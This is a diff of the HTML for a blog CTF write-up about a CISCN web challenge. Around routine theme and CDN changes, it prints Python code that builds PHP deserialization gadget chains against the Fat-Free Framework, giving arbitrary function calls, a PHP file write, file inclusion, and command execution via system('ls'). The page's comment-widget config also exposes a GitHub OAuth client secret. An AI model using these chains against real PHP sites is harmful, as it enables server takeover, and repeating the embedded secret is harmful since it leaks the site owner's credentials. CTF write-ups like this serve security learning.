@@ -16,9 +16,9 @@
 <meta property="article:published_time" content="2020-08-20T16:00:00.000Z">
 <meta property="article:modified_time" content="2021-04-11T21:37:45.000Z">
 <meta property="article:author" content="Frank Li">
+<meta property="article:tag" content="CISCN">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Writeup">
-<meta property="article:tag" content="CISCN">
 <meta name="twitter:card" content="summary">
     
     
@@ -79,7 +79,7 @@
         .card { width: calc(20% - 20px); }
     }
     .card-container { width: 90%; }
-</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Frank" type="application/atom+xml">
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"><link rel="alternate" href="/atom.xml" title="Frank" type="application/atom+xml">
 </head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -189,30 +189,27 @@
 <p>第一次见flag直接放phpinfo里头的。。。找了半天没找到。。。</p>
 <p>在这里把挖到的几条链都放一下吧</p>
 <h3 id="单个任意参数调用任意函数">单个任意参数调用任意函数</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WS</span>:</span></span><br><span class="line">    <span class="comment"># call func with one param</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, func, param</span>):</span></span><br><span class="line"><span class="meta">        @namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Agent</span>():</span></span><br><span class="line">            <span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line"><span class="meta">                @namespace(<span class="params"><span class="string">&#x27;DB\\Jig&#x27;</span></span>)</span></span><br><span class="line">                <span class="class"><span class="keyword">class</span> <span class="title">Mapper</span>:</span></span><br><span class="line"><span class="meta">                    @namespace(<span class="params"><span class="string">&#x27;DB\\SQL&#x27;</span></span>)</span></span><br><span class="line">                    <span class="class"><span class="keyword">class</span> <span class="title">Mapper</span>:</span></span><br><span class="line">                        protected_props = &#123;<span class="string">&#x27;read&#x27;</span>: func&#125;</span><br><span class="line">                    protected_file = param</span><br><span class="line">                    protected_db = Mapper()</span><br><span class="line">                events = &#123;<span class="string">&#x27;disconnect&#x27;</span>: [Mapper(), <span class="string">&#x27;insert&#x27;</span>]&#125;</span><br><span class="line">            protected_server = Base()</span><br><span class="line">        self.a = Agent()  <span class="comment"># autoload</span></span><br><span class="line"><span class="comment"># payload: serialize(WS())</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WS</span>:</span><br><span class="line">    <span class="comment"># call func with one param</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, param</span>):</span><br><span class="line"><span class="meta">        @namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Agent</span>():</span><br><span class="line">            <span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line"><span class="meta">                @namespace(<span class="params"><span class="string">&#x27;DB\\Jig&#x27;</span></span>)</span></span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">Mapper</span>:</span><br><span class="line"><span class="meta">                    @namespace(<span class="params"><span class="string">&#x27;DB\\SQL&#x27;</span></span>)</span></span><br><span class="line">                    <span class="keyword">class</span> <span class="title class_">Mapper</span>:</span><br><span class="line">                        protected_props = &#123;<span class="string">&#x27;read&#x27;</span>: func&#125;</span><br><span class="line">                    protected_file = param</span><br><span class="line">                    protected_db = Mapper()</span><br><span class="line">                events = &#123;<span class="string">&#x27;disconnect&#x27;</span>: [Mapper(), <span class="string">&#x27;insert&#x27;</span>]&#125;</span><br><span class="line">            protected_server = Base()</span><br><span class="line">        <span class="variable language_">self</span>.a = Agent()  <span class="comment"># autoload</span></span><br><span class="line"><span class="comment"># payload: serialize(WS())</span></span><br></pre></td></tr></table></figure>
 <h3 id="任意文件写">任意文件写</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;DB&#x27;</span></span>)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span>:</span></span><br><span class="line">    <span class="comment"># write file</span></span><br><span class="line">    lazy = <span class="literal">True</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;frankli.php&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;asdf&#x27;</span>: <span class="string">&#x27;&lt;?php phpinfo();exit();?&gt;&#x27;</span></span><br><span class="line">    &#125;&#125;</span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">    <span class="built_in">format</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;DB&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Jig</span>:</span><br><span class="line">    <span class="comment"># write file</span></span><br><span class="line">    lazy = <span class="literal">True</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;frankli.php&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;asdf&#x27;</span>: <span class="string">&#x27;&lt;?php phpinfo();exit();?&gt;&#x27;</span></span><br><span class="line">    &#125;&#125;</span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">    <span class="built_in">format</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>
 <h3 id="任意（存在的）文件包含">任意（存在的）文件包含</h3>
 <p>结合上面调用函数的链调用<code>\View-&gt;render</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span>:</span></span><br><span class="line">    <span class="comment"># arbitrary **exisiting** file inclusion</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line">        TEMP = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">        UI = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">    fw = Base()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ses.get(url, params=&#123;<span class="string">&#x27;flag&#x27;</span>: serialize(</span><br><span class="line">    WS([View(), <span class="string">&#x27;render&#x27;</span>], <span class="string">&#x27;frankli.php&#x27;</span>))&#125;</span><br><span class="line">).text)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">View</span>:</span><br><span class="line">    <span class="comment"># arbitrary **exisiting** file inclusion</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line">        TEMP = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">        UI = <span class="string">&#x27;/tmp/&#x27;</span></span><br><span class="line">    fw = Base()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ses.get(url, params=&#123;<span class="string">&#x27;flag&#x27;</span>: serialize(</span><br><span class="line">    WS([View(), <span class="string">&#x27;render&#x27;</span>], <span class="string">&#x27;frankli.php&#x27;</span>))&#125;</span><br><span class="line">).text)</span><br></pre></td></tr></table></figure>
 <h3 id="wmctf的时候挖的rce链">wmctf的时候挖的rce链</h3>
 <p>结合上面调用函数的链调用<code>\Preview-&gt;resolve</code><br>
 然而这次<code>resolve</code>被删了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WS</span>:</span></span><br><span class="line"><span class="meta">    @namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Agent</span>():</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">F3</span>:</span>  <span class="comment"># 随便一个存在的类</span></span><br><span class="line">            <span class="class"><span class="keyword">class</span> <span class="title">Preview</span>:</span></span><br><span class="line">                <span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line">                    hive = &#123;<span class="string">&#x27;node&#x27;</span>: <span class="string">f&#x27;&lt;?php system(&quot;ls&quot;);die(1);?&gt;&#x27;</span>&#125;</span><br><span class="line">                fw = Base()</span><br><span class="line">            events = &#123;<span class="string">&#x27;disconnect&#x27;</span>: [Preview(), <span class="string">&#x27;resolve&#x27;</span>]&#125;</span><br><span class="line">        server = F3()</span><br><span class="line">    a = Agent()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WS</span>:</span><br><span class="line"><span class="meta">    @namespace(<span class="params"><span class="string">&#x27;CLI&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Agent</span>():</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">F3</span>:  <span class="comment"># 随便一个存在的类</span></span><br><span class="line">            <span class="keyword">class</span> <span class="title class_">Preview</span>:</span><br><span class="line">                <span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line">                    hive = &#123;<span class="string">&#x27;node&#x27;</span>: <span class="string">f&#x27;&lt;?php system(&quot;ls&quot;);die(1);?&gt;&#x27;</span>&#125;</span><br><span class="line">                fw = Base()</span><br><span class="line">            events = &#123;<span class="string">&#x27;disconnect&#x27;</span>: [Preview(), <span class="string">&#x27;resolve&#x27;</span>]&#125;</span><br><span class="line">        server = F3()</span><br><span class="line">    a = Agent()</span><br></pre></td></tr></table></figure>
 <p>入口点和上面函数调用的是一样的</p>
 <p>分析没心情写了。。</p>
-
-<div id="gitalk-container"></div>
-<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-		<script>
-		var gitalkConfig = {"clientID":"5955d155fe2ea768241e","clientSecret":"f96bbda9ff434950217f24f7f9369f8b8de3b025","repo":"frankli0324.github.io","owner":"frankli0324","admin":["frankli0324"],"distractionFreeMode":false};
-	    gitalkConfig.id = md5(location.pathname);
-		var gitalk = new Gitalk(gitalkConfig);
-	    gitalk.render("gitalk-container");
-	    </script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
   </div>
 </article>
+
+    <div class="blog-post-comments">
+        <div id="gitalk-container">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
 
 
 
@@ -272,7 +269,7 @@
     Copyright &copy;
     
     
-    2017-2024
+    2017-2025
     Frank Li
   </div>
   <div class="footer-right">
@@ -297,12 +294,12 @@
 
 
 
-  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/7.0.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
 
 
     <!-- jquery -->
  
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js" crossorigin="anonymous"></script> 
 
 
 
@@ -310,7 +307,7 @@
 <!-- clipboard -->
 
   
-    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js" crossorigin="anonymous"></script> 
   
   <script type="text/javascript">
   $(function() {
@@ -353,8 +350,37 @@
 
 <!-- Umami Analytics -->
 
-<!-- Disqus Comments -->
 
+<script src="https://cdn.bootcdn.net/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/gitalk/1.8.0/gitalk.min.css" rel="stylesheet">
+<style>
+  .gt-comment-content:hover {
+    box-shadow: none !important;
+  }
+  .gt-comment-content {
+    border-radius: 5px;
+  }
+</style>
+<script type="text/javascript">
+    (function(){
+        var gitalk = document.createElement('script');
+        gitalk.type = 'text/javascript';
+        gitalk.async = true;
+        gitalk.src = 'https://cdn.bootcdn.net/ajax/libs/gitalk/1.8.0/gitalk.min.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(gitalk);
+        gitalk.onload = function(){
+            var gitalk = new Gitalk({
+                id: md5(location.pathname),
+                clientID: '5955d155fe2ea768241e',
+                clientSecret: 'f96bbda9ff434950217f24f7f9369f8b8de3b025',
+                repo: 'frankli0324.github.io',
+                owner: 'frankli0324',
+                admin: ['frankli0324'],
+            });
+            gitalk.render('gitalk-container');
+        };
+    }());
+</script>
 
 </body>
 </html>
